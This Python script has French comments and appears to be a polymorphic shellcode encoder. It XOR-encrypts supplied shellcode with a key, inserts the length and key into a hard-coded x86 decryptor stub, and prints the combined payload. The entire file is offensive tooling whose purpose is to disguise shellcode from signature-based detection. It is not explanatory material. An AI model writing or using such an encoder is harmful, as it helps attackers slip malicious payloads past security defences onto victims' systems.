from bytetohex import bytetohex
from unsplitter import unsplitter

decryptor = "\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\shellcode_len\\x80\\x74\\x0e\\xff\\xor_key\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"

def xor(shellcode, key, debug):

    # Conversion de la chaîne de caractères en bytes
    shellcode_bytes = bytes.fromhex(shellcode)
    key_bytes = bytes.fromhex(key)

    xored_shellcode = bytearray()
    key_length = len(key_bytes)

    for i in range(len(shellcode_bytes)):
        # Effectuer l'opération de XOR sur chaque octet
        xored_byte = shellcode_bytes[i] ^ key_bytes[i % key_length]
        xored_shellcode.append(xored_byte)
        # Parse du shellcode
        hex_shellcode = bytetohex(xored_shellcode)
        crypted_shellcode = unsplitter(hex_shellcode)
        unsplitter_key = unsplitter(key)
        final_key = unsplitter_key[1:]


    if debug == "1":
        print("{DEBUG-MOD} shellcode_bytes -> ", shellcode_bytes)
        print("{DEBUG-MOD} key_bytes -> ", key_bytes)   
        print("{DEBUG-MOD} xored_byte -> ", xored_byte)
        print("{DEBUG-MOD} xored_shellcode -> ", xored_shellcode)
        print("{DEBUG-MOD} hex_shellcode -> ", hex_shellcode)
        print("\n --- # ---------- # ---\n")
    else:
        print("", end="")

    print("\n ========== Shellcode information ==========\n")
        # - Resultat du polymorphisme - #
    taille = len(crypted_shellcode) / 4
    taille_sans_zero = str(int(taille))
    print("- Shellcode chiffré : ", crypted_shellcode, "\n- Taille : ",taille_sans_zero," octets","\n- Clé : ", unsplitter_key)
    print("\n ========== Payload Polymorphique-shellcode ==========")
    taille_sans_zero_hex = hex(int(taille_sans_zero))
    taille_sans_zero_hex = taille_sans_zero_hex[1:]
    
    payload = decryptor.replace("shellcode_len", taille_sans_zero_hex).replace("xor_key", final_key)
    print("\n- Payload : ", payload + crypted_shellcode + "\n")
